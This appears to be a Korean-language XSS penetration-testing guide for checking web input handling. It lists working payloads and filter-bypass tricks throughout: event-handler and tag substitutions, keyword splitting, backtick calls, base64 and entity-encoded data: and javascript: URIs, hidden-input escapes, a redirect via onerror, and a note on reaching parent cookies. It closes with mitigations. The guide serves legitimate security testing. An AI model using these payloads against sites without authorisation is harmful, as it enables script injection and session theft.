# XSS 테스팅 가이드

## 1. 추천 페이로드

### 1.1. 기본 페이로드
```html
<script>alert(1111)</script>
```

### 1.2. `<script>`와 같은 일반 태그가 차단된 경우
```html
<details onpointerover=confirm(1111)></details>
```

### 1.3. input value 등 속성값에 삽입되는 경우 (버튼 등 액션 필요)
```html
" onkeydown=confirm(1111) contenteditable onfocus
```

### 1.4. 띄어쓰기(공백) 불가 시
```html
<svg/onload=confirm(1111)/>
```

### 1.5. Polyglot XSS
다양한 컨텍스트에서 동작하는 단일 페이로드. 예시:
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
```

## 2. 점검 방법

### 2.1. 입력값 위치 파악

#### 2.1.1. 태그 속성 내부 삽입
예시:
```html
<input type="text" value="입력값">
```
`"` (double quote) 등으로 속성값을 탈출하여 XSS 삽입

예시:
```html
<input value="test" onpointerover=confirm(1111)/>
```

#### 2.1.2. 태그 외부 삽입
예시:
```html
<a href="url">입력값</a>
```
기존 태그를 닫고 새 태그로 XSS 삽입 필요

예시:
```html
<a href="test.com"></a><script>alert(1111)</script></a>
```

### 2.2. 필터링 패턴 확인 및 우회

#### 2.2.1. 특수문자 제한
입력 불가 특수문자(`"`, `<`, `(`, `=`) 확인 후 우회 방법 선택

- `"` 불가: 새로운 태그 삽입 가능한지 확인
  ```html
  <script>alert(1111)</script>
  ```

- `<` 불가: 속성값으로 우회
  ```html
  <input value="test" onpointerover=confirm(1111)/>
  ```

- `()` 불가: 백틱(`)으로 우회
  ```html
  <input value="test" onpointerover=confirm`1111`/>
  ```

#### 2.2.2. 이벤트 핸들러 제한
`onload`, `onerror` 등 기본 이벤트 차단 시, `onpointerover`, `onkeydown`, `ondrag` 등 특수 이벤트 활용

base64 인코딩/메타 태그 우회:
```html
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMTExKTwvc2NyaXB0Pg==">
```

#### 2.2.3. 키워드 삭제/치환 필터링
- `<script>` 삭제 시:
  ```html
  <scr<script>ipt>alert(1111)</scr<script>ipt>
  ```

- `alert`, `confirm`, `prompt` 차단 시:
  ```html
  <svg onload="window['ale'+'rt'](1)"></svg>
  <svg onload=confirm(1)/>
  ```

#### 2.2.4. 추가 문자 삽입 우회
- 뒤에 문장 추가: `<!--` 주석 활용
  ```html
  <script>alert(1111)</script><!--
  ```

- 앞에 문장 추가: 패턴 분석 후 비슷한 이벤트 핸들러 사용 또는 태그 구조 탈출
  ```html
  </div></a><script>alert(1111)</script>
  ```

#### 2.2.5. 활성 하이퍼링크 속성 활용
HTML 엔티티 인코딩:
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click</a>
```

#### 2.2.6. form 태그 활용
```html
<form action=data:text/html;charset=utf-8,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%31%31%31%29%3c%2f%73%63%72%69%70%74%3e><input type=submit></form>
```

## 3. 상황별 페이로드 및 체크리스트

### 3.1. 특수문자 필터링 테스트
`"`, `'`, `<`, `>`, `(`, `)`, `:`, `=` 등

### 3.2. 응답 값 탈출 가능성 확인
value, param, 주석 등에서 속성값/문맥 탈출 시도

### 3.3. 이벤트 핸들러 필터링 체크
서버에서 허용하는 이벤트 핸들러 목록 확인
`onload`, `onerror` 등 필터링 우회: 특수 이벤트, 태그, base64 등 활용

### 3.4. 대소문자 필터링 우회
```html
<script> → <sCriPt>
```

### 3.5. `<script>` 필터링 우회
단어 삭제:
```html
<scr<script>ipt>
```
다른 태그/구문 사용

### 3.6. 알림창 함수(alert 등) 필터링 우회
- `alert()` → `prompt()`, `confirm()`
- 모두 차단 시 강제 리다이렉트/CSRF 시도:
  ```html
  <img src=x onerror="location.href='http://warning.or.kr/'"/>
  ```
- `window[]`, `constructor()`, `eval` 등으로 우회
  ```html
  alert → window['al'+'ert']
  ```

### 3.7. `()` 필터링 우회
백틱(`) 사용:
```html
confirm`1111`
```

### 3.8. 다양한 인코딩 우회
- **유니코드**: `\u0028`
- **URL 인코딩**: `%28`
- **더블 인코딩**: `%2528`
- **BASE64**: `eval(atob('base64_encoded_payload'))`
- **HEX**: `\x28`
- **String.fromCharCode**: `String.fromCharCode(88,83,83)`
- **HTML 엔티티**: `&lt;`

### 3.9. 주요 태그 필터링 우회
`<script>`, `<img>`, `<svg>` 차단 시 `<details>`, `<animate>` 등 활용
강제 동작: `contenteditable`, `onfocus` 옵션 등

### 3.10. 띄어쓰기 필터링 우회
`/`, `` (IE), 탭 등
```html
<svg/onload=alert(1)>
```

### 3.11. POST/GET 변경
동일 파라미터 사용 시 XSS 성공 가능성 존재

### 3.12. 전송/응답 패킷 불일치 시
응답 패킷 내 페이로드를 전송 패킷에 임의 삽입

### 3.13. type=hidden 우회
- **type이 input값 앞**: `"`, `'`로 hidden element 탈출
  ```html
  <img src="x" onerror="alert(1)"> → "><img src="x" onerror="alert(1)">
  ```

- **type이 뒤**: type 먼저 선언해 다른 type으로 변경
  ```html
  onfocus="alert(1)" → " type="text" onfocus="alert(1)"
  ```

- **accesskey 활용**:
  ```html
  <input type="hidden" name="xsstest" value="test" accesskey="X" onclick="alert(45)" a=" ">
  ```

### 3.14. iframe, object, embed, meta 태그 활용
data: 프로토콜 사용

### 3.15. `<a>` 태그 내 `'` 치환
`'`로 치환되어도 동작

### 3.16. href 내부 tab(탭) 특성
```html
<a href=j	avascrip	t:confirm(1)>
```

### 3.17. 응답값 뒤에 값 추가 시
`//` 또는 `<!--`로 주석 처리 우회
```html
<img src onerror=prompt(1)<!--
```

### 3.18. `<` 뒤 값 치환
```html
<x<svg/onload=prompt(1)/>/>
```

### 3.19. iframe 내 parent.document.cookie 접근 가능성

### 3.20. 이모지, JSFUCK 등 특수 필터링 우회

## 4. 패킷 내 검색 사항
js 내 `location.hash` 등 파라미터 존재 시
```
URL#XSS_Payload
```
로 XSS 시도

## 5. 조치 방법 및 참고
- **CSP(Content Security Policy) 적용**
- **DOMPurify 등 신뢰성 있는 Sanitizer 사용**
- **최신 XSS 우회 페이로드 및 이벤트 핸들러, 태그 목록은 PortSwigger XSS Cheat Sheet에서 최신 사례 확인**
